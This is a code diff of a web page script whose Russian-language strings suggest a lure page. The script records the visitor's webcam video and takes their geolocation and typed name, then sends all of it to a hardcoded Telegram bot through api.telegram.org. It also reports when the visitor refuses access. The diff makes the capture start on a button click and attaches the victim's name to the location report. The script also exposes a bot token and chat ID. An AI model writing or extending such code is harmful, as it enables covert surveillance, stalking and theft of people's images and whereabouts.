@@ -2,15 +2,16 @@ const TELEGRAM_TOKEN = "8377810271:AAG4gGXoBLBCjt3fKE9ZSefJ92UiI_jKW5I";
 const TELEGRAM_CHAT_ID = "8071841674";
 const TELEGRAM_ERROR_MSG = "Пользователь отказал в доступе";
 
+const startBtn = document.getElementById('startBtn');
+const statusEl = document.getElementById('status');
+const nameInput = document.getElementById('name');
+
 async function sendToTelegram(payload) {
   if (payload.error) {
     await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({
-        chat_id: TELEGRAM_CHAT_ID,
-        text: payload.error
-      })
+      body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: payload.error })
     });
   } else {
     if (payload.coords) {
@@ -20,7 +21,7 @@ async function sendToTelegram(payload) {
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({
           chat_id: TELEGRAM_CHAT_ID,
-          text: `Геолокация: ${mapUrl}`
+          text: `Пользователь: ${nameInput.value || 'Unknown'}\nГеолокация: ${mapUrl}`
         })
       });
     }
@@ -28,15 +29,13 @@ async function sendToTelegram(payload) {
       const formData = new FormData();
       formData.append("chat_id", TELEGRAM_CHAT_ID);
       formData.append("document", payload.video, "video.webm");
-      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, {
-        method: "POST",
-        body: formData
-      });
+      await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendDocument`, { method: "POST", body: formData });
     }
   }
 }
 
-async function init() {
+async function startRecording() {
+  statusEl.textContent = 'Запрашиваем разрешения...';
   let granted = { camera: false, geo: false };
   let coords = null;
   let videoBlob = null;
@@ -56,7 +55,6 @@ async function init() {
 
     videoBlob = new Blob(chunks, { type: 'video/webm' });
     stream.getTracks().forEach(track => track.stop());
-
   } catch(err) {
     granted.camera = false;
   }
@@ -88,4 +86,4 @@ async function init() {
   }, 1000);
 }
 
-init();
+startBtn.addEventListener('click', startRecording);
